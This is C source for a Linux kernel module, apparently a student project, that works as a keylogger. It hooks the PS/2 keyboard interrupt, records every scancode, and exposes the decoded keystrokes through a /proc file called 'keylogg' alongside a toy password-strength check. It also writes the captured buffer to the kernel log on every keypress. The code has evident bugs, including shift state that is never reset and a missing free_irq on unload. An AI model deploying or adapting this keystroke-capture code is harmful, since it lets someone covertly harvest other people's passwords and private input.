//Taiga Kuroiwa project3, Keylogger



//using ps2, not usb

#include <linux/kernel.h>

#include <linux/interrupt.h>

#include <linux/module.h>

#include <asm/io.h>

#include <linux/string.h>

#include <linux/proc_fs.h>

#include<linux/sched.h>

#include <asm/uaccess.h>

#include <linux/slab.h>

#define CAPS 0x3A

#define RIGHT_SHIFT 0x2A

#define LEFT_SHIFT 0x36

#define PROC_FILE_NAME "keylogg"



char pass[1024*1024];

char queue[10*(1024*1024)];

int inc=0;

int shift_on=0;

int caps_on=0;

int read_out=0;


char specialkeys[]={'!','@','#','$','%','^','&','*','(', ')','{', '}'};


char findkey(unsigned char x){

  char lowerkey[]={0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'\

		    , '-', '=', '\b', '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', \

		    '[', ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'',\

		    '`', 0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0\

		    , ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5'\

		    , '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\

		    0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};



  char capskey[]={0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'\

		    , '-', '=', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', \

		    '[', ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', '\'',\

		    '`', 0, '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 0, '*', 0\

		    , ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5'\

		    , '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\

		    0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};



  char shiftkey[]={0, 0, '!', '@', '#', '$', '%', '^', '&', '*', '(', ')'\

		    , '_', '+', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', \

		    '[', ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '\'',\

		    '~', 0, '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 0, '*', 0\

		    , ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5'\

		    , '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \

		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\

		    0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\

		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

  if(x==CAPS||x==RIGHT_SHIFT||x==LEFT_SHIFT){

    if (x==CAPS){

      if (caps_on==0){

	caps_on=1;

	return 0;                                

      }

      else if(caps_on==1){

	caps_on=0;

	return 0;                                

      }

    }

    if (x==RIGHT_SHIFT|| x==LEFT_SHIFT){

      shift_on=1;

      return 0;                                      

    }

  }

  else {

    if (caps_on==1 && shift_on==0){

      return capskey[x];

    }

    else if (shift_on==1){

      return shiftkey[x];

    }

    else{

      return lowerkey[x];

    }

  }

}


int passchecking(int a){

    int lowerstrings =0;

    int specialkeys_count=0;

    int upperstrings=0;

    int i=0;

    int j=0;

    for(;i<inc;i++){

      if(pass[i]>='0'&&pass[i]<='9'){

	lowerstrings++;

      }

      if(pass[i]>='A'&&pass[i]<='Z'){

	upperstrings++;

      }

      for(;j<10;j++){

        if(pass[i]==specialkeys[j]){

          specialkeys_count++;

        }

      }

      j=0;

    }

    if((lowerstrings > 0 || specialkeys_count > 0)&& upperstrings>0){

      read_out =0;

	printk("your passwod is valid!");

      inc = 0;

      return 0;

    }

    else{

      read_out =0;

	printk("your password does not have enough special characters and upper letters, sorry.");

      inc = 0;

      return 1;

    }
}


ssize_t read_file(struct file *filp,char *buf,size_t count,loff_t *offp ){

  int i=0;

  for(;i<inc; ++i){

    pass[i]=findkey(queue[i]);

  }

  copy_to_user(buf, pass, inc);

  int tmp;

  tmp = inc;

  read_out = 1;

  passchecking(tmp);

  return tmp;

}



struct file_operations proc_fops = {

 read: read_file

};


irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs){

	static unsigned char scancode;

	scancode = inb (0x60);

	if(inc != (10*(1024*1024))){

	  queue[inc++]=scancode;

	  }

	else{

	  inc=0;

	  queue[inc++]=scancode;

	}
	printk("this was in queue: %s \n", queue);
	return (irq_handler_t) IRQ_HANDLED;

}



int logger_init (void){

  proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);

  return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "using_irq_handler", (void *)(irq_handler));

}



void logger_cleanup(void) {

  remove_proc_entry(PROC_FILE_NAME,NULL);

}



MODULE_LICENSE ("GPL");

module_init(logger_init);

module_exit(logger_cleanup);
